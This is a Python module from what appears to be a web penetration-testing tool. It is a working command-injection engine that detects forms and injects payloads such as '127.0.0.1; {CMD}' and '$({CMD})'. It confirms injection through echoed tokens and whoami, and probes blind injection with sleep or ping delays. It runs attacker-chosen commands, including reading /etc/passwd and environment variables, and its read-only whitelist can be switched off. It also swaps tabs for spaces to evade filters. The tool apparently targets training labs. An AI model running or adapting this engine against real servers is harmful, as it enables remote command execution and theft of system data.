# -*- coding: utf-8 -*-
"""命令注入引擎：表单自动识别 + 标记回显确认 + 输出提取 + 只读命令白名单。"""

import html
import random
import re
import string

from .forms import parse_form
from .httpclient import HTTPError

TEMPLATES = [
    {"name": "分号连接", "template": "127.0.0.1; {CMD}", "os": "Linux"},
    {"name": "AND 连接", "template": "127.0.0.1 && {CMD}", "os": "Linux / Windows"},
    {"name": "管道连接", "template": "127.0.0.1 | {CMD}", "os": "Linux / Windows"},
    {"name": "OR 连接", "template": "127.0.0.1 || {CMD}", "os": "Linux"},
    {"name": "反引号替换", "template": "127.0.0.1`{CMD}`", "os": "Linux"},
    {"name": "美元替换", "template": "127.0.0.1$({CMD})", "os": "Linux"},
    {"name": "换行注入", "template": "127.0.0.1\n{CMD}", "os": "Linux"},
    {"name": "Windows 连接", "template": "127.0.0.1 & {CMD}", "os": "Windows"},
]

ALLOW_PREFIXES = (
    "whoami", "id", "pwd", "ls", "cat /etc/passwd", "uname", "hostname", "ifconfig",
    "ip a", "ip addr", "ps", "env", "date", "which", "echo", "dir", "type ",
    "ipconfig", "systeminfo", "net user", "tasklist", "ver",
)
FORBIDDEN = (";", "&", "|", "`", "$(", ">", "<", "\n", "\r")


def _rand(n=6):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class CmdiEngine:
    def __init__(self, agent, task):
        self.a = agent
        self.t = task
        self._forms: dict[str, dict | None] = {}

    # ---------- 表单识别 ----------
    def form_for(self, param: str) -> dict | None:
        if param in self._forms:
            return self._forms[param]
        form = None
        try:
            page = self.a.raw("GET", self.a.base, params=self.a.query or None)
            form = parse_form(page.text, param, page.url)
            if not form:
                self.t.info(f"页面 {page.status} / {page.length}B / {page.url} / "
                            f"表单数 {page.text.lower().count('<form')}，"
                            f"未匹配到参数 {param} 所在表单")
        except HTTPError as exc:
            self.t.warn(f"表单识别失败：{exc}")
        if form:
            self.t.info(f"识别到表单：{form['method']} {form['action']} · "
                        f"字段 {', '.join(form['fields'].keys())}")
        self._forms[param] = form
        return form

    def send_value(self, param: str, value: str, form: dict | None = None,
                   timeout: float | None = None):
        form = form if form is not None else self.form_for(param)
        if form:
            data = dict(form["fields"])
            data[param] = value
            if form["method"] == "POST":
                return self.a.raw("POST", form["action"], data=data, timeout=timeout)
            return self.a.raw("GET", form["action"], params=data, timeout=timeout)
        return self.a.send({param: value}, timeout=timeout)

    # ---------- 命令白名单 ----------
    def check_command(self, command: str, allow_all: bool = False) -> None:
        cmd = (command or "").strip()
        if not cmd:
            raise ValueError("命令不能为空")
        if len(cmd) > 200:
            raise ValueError("命令过长（上限 200 字符）")
        if allow_all:
            return
        low = cmd.lower()
        if any(sym in cmd for sym in FORBIDDEN):
            raise PermissionError("安全模式禁止命令连接符，请改用单条只读命令")
        if not any(low == p or low.startswith(p) for p in ALLOW_PREFIXES):
            raise PermissionError(f"安全模式仅允许只读侦察命令。当前命令不在白名单：{cmd}")

    # ---------- 探测 ----------
    def probe(self, params: list[str]) -> dict:
        base = self.a.baseline()
        self.t.info(f"基线 {base.status} / {base.length}B · 连接符 {len(TEMPLATES)} 种")
        findings = []

        for param in params:
            self.t.check_stop()
            self.t.log(f"探测参数 [{param}]", "step")
            form = self.form_for(param)
            if form:
                self.t.info(f"提交方式：{form['method']}（自动跟随表单）")

            for tpl in TEMPLATES:
                self.t.check_stop()
                token = "qz" + _rand()
                payload = tpl["template"].replace("{CMD}", f"echo {token}")
                try:
                    resp = self.send_value(param, payload, form)
                except HTTPError as exc:
                    self.t.err(str(exc))
                    return {"vulnerable": False, "findings": [], "error": str(exc)}
                if token in resp.text and token not in base.text:
                    self.t.ok(f"命令拼接生效：{tpl['name']}（{tpl['os']}）")
                    evidence = self._whoami(param, tpl["template"], form, base.text)
                    findings.append({
                        "param": param,
                        "name": tpl["name"],
                        "template": tpl["template"],
                        "os": tpl["os"],
                        "payload": payload,
                        "whoami": evidence,
                    })
                    break
                who = self._whoami(param, tpl["template"], form, base.text)
                if who:
                    self.t.ok(f"命令拼接生效（whoami 回显）：{tpl['name']}（{tpl['os']}）")
                    findings.append({
                        "param": param,
                        "name": tpl["name"],
                        "template": tpl["template"],
                        "os": tpl["os"],
                        "payload": tpl["template"].replace("{CMD}", "whoami"),
                        "whoami": who,
                    })
                    break
                if resp.length != base.length:
                    self.t.info(f"{tpl['name']} 无标记回显（长度 {resp.length}B）")

        if not findings:
            self.t.warn("未确认命令注入，可尝试更换参数名或检查靶场路径")
            return {"vulnerable": False, "findings": []}
        best = findings[0]
        self.t.ok(f"确认可用注入点：参数 {best['param']} / {best['name']}")
        return {
            "vulnerable": True,
            "findings": findings,
            "best": best,
            "summary": f"发现命令注入：参数 {best['param']}（{best['name']}）",
            "severity": "critical",
        }

    BAD_IDENTITY = (
        "错误", "参数", "无效", "无法", "不是内部", "not found", "invalid",
        "usage", "unrecognized", "denied", "wrong", "error", "拒绝访问",
    )

    @classmethod
    def _valid_identity(cls, line: str) -> bool:
        if not line:
            return False
        low = line.lower()
        if any(bad in low for bad in cls.BAD_IDENTITY):
            return False
        if "\\" in line and " " not in line.strip():
            return True
        if re.search(r"uid=\d+", low):
            return True
        if any(token in low for token in ("www-data", "nobody", "apache", "nginx",
                                          "nt authority", "root@")):
            return True
        return False

    def _whoami(self, param: str, template: str, form: dict | None = None,
                baseline_text: str = "") -> str:
        payload = template.replace("{CMD}", "whoami")
        try:
            if baseline_text:
                base_text = baseline_text
            else:
                base = self.send_value(param, "127.0.0.1", form)
                base_text = base.text
            resp = self.send_value(param, payload, form)
        except HTTPError:
            return ""
        output = self.extract_output(resp.text, base_text, payload)
        first = output.strip().splitlines()[0] if output.strip() else ""
        if first and not self._valid_identity(first):
            self.t.info(f"忽略非身份输出：{first[:60]}")
            return ""
        if first:
            self.t.data(f"whoami → {first}")
        return first

    # ---------- 盲命令（时间型） ----------
    def blind_probe(self, param: str, template: str | None = None) -> dict:
        form = self.form_for(param)
        base = self.send_value(param, "127.0.0.1", form)
        self.t.info(f"基线耗时 {base.elapsed:.2f}s，开始时间型盲命令探测")
        probe_timeout = max(self.a.timeout, base.elapsed + 15)
        templates = [template] if template else [
            "127.0.0.1 && {CMD}", "127.0.0.1; {CMD}", "127.0.0.1 | {CMD}",
        ]
        candidates = [
            ("Windows ping 延迟", "ping -n 10 127.0.0.1", "Windows"),
            ("Linux sleep 延迟", "sleep 5", "Linux"),
        ]
        for tpl in templates:
            for name, command, os_name in candidates:
                self.t.check_stop()
                payload = tpl.replace("{CMD}", command)
                try:
                    resp = self.send_value(param, payload, form, timeout=probe_timeout)
                except HTTPError as exc:
                    self.t.err(str(exc))
                    continue
                extra = resp.elapsed - base.elapsed
                self.t.info(f"{name}：总 {resp.elapsed:.2f}s / 增量 {extra:.2f}s")
                if extra > max(2.5, base.elapsed * 1.5):
                    self.t.ok(f"确认盲命令执行：{name}（+{extra:.2f}s）")
                    return {
                        "vulnerable": True,
                        "param": param,
                        "name": name,
                        "os": os_name,
                        "template": tpl,
                        "command": command,
                        "payload": payload,
                        "baseline_ms": round(base.elapsed * 1000),
                        "payload_ms": round(resp.elapsed * 1000),
                        "summary": f"盲命令注入：参数 {param}（{name}，+{extra:.1f}s）",
                        "severity": "critical",
                    }
        self.t.warn("未观察到明显延迟，目标可能未执行命令或存在缓存")
        return {"vulnerable": False, "param": param,
                "summary": "未确认盲命令注入", "severity": "info"}

    # ---------- 执行 ----------
    def execute(self, param: str, template: str, command: str,
                allow_all: bool = False) -> dict:
        self.check_command(command, allow_all)
        form = self.form_for(param)
        payload = template.replace("{CMD}", command)
        self.t.step_msg(f"执行：{command}")
        self.t.data(f"payload = {payload}（{form['method'] if form else self.a.method}）")
        try:
            base = self.send_value(param, "127.0.0.1", form)
            resp = self.send_value(param, payload, form)
        except HTTPError as exc:
            raise RuntimeError(str(exc)) from exc
        output = self.extract_output(resp.text, base.text, payload)
        effective = command
        if not output and " " in command:
            alt = command.replace(" ", "\t")
            alt_payload = template.replace("{CMD}", alt)
            try:
                alt_resp = self.send_value(param, alt_payload, form)
            except HTTPError:
                alt_resp = None
            if alt_resp is not None:
                alt_output = self.extract_output(alt_resp.text, base.text, alt_payload)
                if alt_output:
                    self.t.info("空格疑似被过滤，已改用 Tab 分隔并成功执行")
                    output = alt_output
                    effective = alt
                    payload = alt_payload
                    resp = alt_resp
        if output:
            for line in output.splitlines()[:40]:
                self.t.log(line, "data")
        else:
            self.t.warn("命令已发送，但响应中没有可识别的输出")
        return {"command": command, "effective": effective, "payload": payload, "output": output,
                "method": form["method"] if form else self.a.method,
                "status": resp.status, "length": resp.length}

    NOISE = (
        "ping ", "bytes from", "round-trip", "rtt ", "packet loss", "seq=", "ttl=",
        "--- ", "statistics ---", "reply from", "request timed out",
        "正在 ping", "来自 ", "已发送", "已接收", "丢失", "往返行程",
        "最短 =", "最长 =", "平均 =", "请求超时", "数据包",
    )

    @classmethod
    def extract_output(cls, text: str, baseline_text: str = "", payload: str = "") -> str:
        def clean(raw: str) -> str:
            plain = html.unescape(re.sub(r"<[^>]+>", "", raw))
            kept = []
            for line in plain.splitlines():
                item = line.strip()
                if not item:
                    continue
                low = item.lower()
                if payload and payload.strip() and payload.strip() in item:
                    continue
                if any(noise in low for noise in cls.NOISE):
                    continue
                kept.append(item)
            return "\n".join(kept)

        base_lines = set()
        if baseline_text:
            base_pre = re.findall(r"<pre[^>]*>(.*?)</pre>", baseline_text, re.S | re.I)
            source = base_pre[0] if base_pre else baseline_text
            base_plain = html.unescape(re.sub(r"<[^>]+>", "", source))
            base_lines = {line.strip() for line in base_plain.splitlines() if line.strip()}

        for pattern in (r"<pre[^>]*>(.*?)</pre>", r"<textarea[^>]*>(.*?)</textarea>",
                        r"<code[^>]*>(.*?)</code>"):
            matches = re.findall(pattern, text, re.S | re.I)
            for raw in matches:
                cleaned = clean(raw)
                if base_lines:
                    diff = [line for line in cleaned.splitlines() if line not in base_lines]
                    if diff:
                        return "\n".join(diff)
                    continue
                if cleaned:
                    return cleaned
        return ""
